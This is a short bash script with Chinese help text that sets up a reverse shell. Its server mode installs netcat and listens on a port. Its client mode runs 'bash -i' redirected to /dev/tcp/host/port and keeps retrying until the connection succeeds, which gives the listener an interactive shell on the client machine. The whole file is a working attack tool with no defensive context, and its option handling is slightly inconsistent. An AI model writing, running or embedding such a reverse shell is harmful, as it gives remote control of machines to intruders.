#!/bin/bash

# Server
# ./script.sh -t server -p 11111

# Client
# ./script.sh -t client -p 11111 -h host

start_type=""
host=""
port=""

show_help() {
    echo "使用方法: $0 [选项]"
    echo ""
    echo "选项:"
    echo "  -t  <server|client>  指定启动类型 (必选)"
    echo "  -h  <IP地址>         监听 IP 或目标 IP (连接类型为 client 时必选)"
    echo "  -p  <端口>           监听端口或目标端口 (必选)"
    echo "  -h                  显示此帮助信息"
    exit 0
}

# 解析参数
while getopts ":t:h:p:s:" OPT; do
    case "$OPT" in
    t) start_type="$OPTARG" ;;
    h) host="$OPTARG" ;;
    p) port="$OPTARG" ;;
    s) pass="$OPTARG" ;;
    \?)
        echo "错误: 无效选项 -$OPTARG" >&2
        show_help
        ;;
    esac
done

# 检查 start_type 是否合法
if [[ "$start_type" != "server" && "$start_type" != "client" ]]; then
    echo "错误: -t 选项必须是 'server' 或 'client'" >&2
    show_help
fi

if [[ -z "$port" ]]; then
    echo "请设置端口号 -p"
    show_help
fi

install_tools() {
    if ! command -v nc &>/dev/null; then
        echo "错误: netcat(nc) 工具未安装，正在尝试安装..."
        if command -v apt-get &>/dev/null; then
            apt-get install -y netcat
        elif command -v yum &>/dev/null; then
            yum install -y nc
        elif command -v brew &>/dev/null; then
            brew install nc
        else
            echo "无法找到包管理器，无法安装 nc" >&2
            exit 1
        fi
        echo "netcat(nc) 安装成功!"
    fi
}

if [[ "$start_type" == "server" ]]; then
    install_tools
    nc -lvp $port
fi

if [[ "$start_type" == "client" ]]; then
    while true; do
        bash -i >&/dev/tcp/$host/$port 0>&1 2>/dev/null
        if [[ $? -ne 0 ]]; then
            echo "连接失败，正在重新尝试..."
            sleep 5
        else
            break
        fi
    done
fi
